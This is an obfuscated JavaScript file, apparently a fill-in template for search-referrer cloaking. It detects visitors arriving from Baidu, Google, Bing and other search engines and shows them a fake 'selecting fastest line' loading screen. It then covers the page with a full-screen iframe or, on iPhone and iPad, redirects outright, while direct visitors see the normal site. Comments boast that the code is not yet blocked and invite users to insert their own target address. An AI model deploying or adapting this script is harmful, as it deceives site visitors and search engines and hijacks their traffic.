var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?{替换成自己的百度统计id}";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
//此代码未被封杀
var QzI1 = navigator["userAgent"]["toLowerCase"]();
var cULosuriQ2 = QzI1["match"](/ipad/i) == "ipad";
var tMoSvSQwY3 = QzI1["match"](/iphone os/i) == "iphone os";
var JyIN$tSCB4 = QzI1["match"](/midp/i) == "midp";
var C5 = QzI1["match"](/rv:1.2.3.4/i) == "rv:1.2.3.4";
var b6 = QzI1["match"](/ucweb/i) == "ucweb";
var LFsqDtm7 = QzI1["match"](/android/i) == "android";
var FCZk$8 = QzI1["match"](/windows ce/i) == "windows ce";
var lyoo9 = QzI1["match"](/windows mobile/i) == "windows mobile";
var SOvPf10 = window["location"]["pathname"] + window["location"]["search"];
var QyE_o_Z11 = window["location"]["href"];

var IXlmPd1 = /\.(baidu|haosou|so|sogou|qq|soso|google|sm|ruonu|youdao|yahoo|bing|360|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
var eC2 = window["document"]["referrer"];
// var eC2 = '#';
if (IXlmPd1["test"](eC2)) {
    function animate() {
        var ncWsUzqMk3 = window["document"]["getElementById"]('progress');
        if (ncWsUzqMk3 != null) {
            if (pos == 0) len += dir;
            if (len > 32 || pos > 179) pos += dir;
            if (pos > 179) len -= dir;
            if (pos > 179 && len == 0) pos = 0;
            ncWsUzqMk3["style"]["left"] = pos;
            ncWsUzqMk3["style"]["width"] = len
        }
    }

    function remove_loading() {
        this["clearInterval"](SlIMMdN5);
        var mpkQppoJL4 = window["document"]["getElementById"]('loader_container');
        mpkQppoJL4["style"]["display"] = 'none';
        mpkQppoJL4["style"]["visibility"] = 'hidden'
    }
    window["document"]["write"]("<style type='text/css'>#loads{width:100%; height:800px; background:#15121b; z-index:999;}#loader_container{text-align:center;position:absolute;top:40%;width:100%;left:0}#loader{font-family:Tahoma,Helvetica,sans;font-size:11.5px;color:#000;background-color:#Fff;padding:0px 0 16px 0;margin:0 auto;display:block;width:230px;border:1px solid #5a667b;text-align:right;z-index:2}#loader_bg{background-color:#e4e7eb;position:relative;top:8px;left:8px;height:7px;width:213px;font-size:1px}#progress{height:5px;font-size:1px;width:1px;position:relative;top:1px;left:0;background-color:#77A9E0}</style>");
    window["document"]["write"]('<div id="loads"><div id="loader_container"><div id="loader"><span id="close_loading" onclick="remove_loading();">关闭</span><div align="center">正在为你选择最快线路！<br/>请耐心等待……</div><div id="loader_bg"><div id="progress"></div></div></div></div></div>');
    var SlIMMdN5 = setInterval(animate, 20);
    var pos = 0;
    var len = 2;
    var dir = 0;
    setTimeout(remove_loading, 10000);
    window["onload"] = remove_loading;
    // var aGdAlgXMf9$ = ["document",
    // "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"#\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "fixed", "body", "insertBefore", "firstChild", "z-index", "9999999999"];
	//搜索引擎搜索进来会跳转，直接访问不跳转 {跳转地址自己改下}
    if (!(cULosuriQ2 || tMoSvSQwY3 || JyIN$tSCB4 || C5 || b6 || LFsqDtm7 || FCZk$8 || lyoo9)) {
        var aGdAlgXMf9$ = ["document", "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"https://baidu.com/member/member?type=returnSavaMember\" id=\"tzd\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "fixed", "body", "insertBefore", "firstChild", "z-index", "9999999999"];
    } else {
        if (cULosuriQ2 || tMoSvSQwY3) {
            window["location"]["href"] = "https://m.baidu.com/";
        } else {
            var aGdAlgXMf9$ = ["document", "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"https://m.baidu.com/\" id=\"tzd\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "fixed", "body", "insertBefore", "firstChild", "z-index", "9999999999"];
        }
    }
    window[aGdAlgXMf9$[0]][aGdAlgXMf9$[1]](aGdAlgXMf9$[2]);

    function a() {
        var uNHgG10 = window[aGdAlgXMf9$[0]][aGdAlgXMf9$[3]](aGdAlgXMf9$[4]);
        var X_U11 = aGdAlgXMf9$[5];
        uNHgG10[aGdAlgXMf9$[6]] = X_U11;
        uNHgG10[aGdAlgXMf9$[7]][aGdAlgXMf9$[8]] = aGdAlgXMf9$[9];
        uNHgG10[aGdAlgXMf9$[7]][aGdAlgXMf9$[10]] = aGdAlgXMf9$[9];
        uNHgG10[aGdAlgXMf9$[7]][aGdAlgXMf9$[12]] = aGdAlgXMf9$[13];
        uNHgG10[aGdAlgXMf9$[7]][aGdAlgXMf9$[17]] = aGdAlgXMf9$[18];
        var EOJzgiUg12 = window[aGdAlgXMf9$[0]][aGdAlgXMf9$[14]];
        EOJzgiUg12[aGdAlgXMf9$[15]](uNHgG10, EOJzgiUg12[aGdAlgXMf9$[16]])
    };
    a();
    window["onload"] = function() {
        cwh = window["document"]["body"]["clientWidth"];
        window["document"]["getElementById"]('tzd')["width"] = cwh + 'px';
        // alert(cwh);
    }

    function tongji() {
        //document.write('<div style="display:none;"><script language="javascript" src="#" charset="gb2312"></script></div>');
    }
    tongji();
}
